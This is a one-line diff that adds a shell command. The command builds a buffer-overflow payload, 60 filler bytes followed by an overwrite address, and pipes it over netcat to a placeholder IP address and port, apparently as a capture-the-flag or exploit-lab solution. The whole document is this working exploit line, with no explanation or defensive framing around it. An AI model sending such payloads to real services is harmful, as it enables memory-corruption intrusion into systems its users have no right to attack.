@@ -1,0 +1,1 @@
+perl -e 'print "A"x60 . "\xb3\xba\x37\x13" . "\n";' | nc <ip> <port>
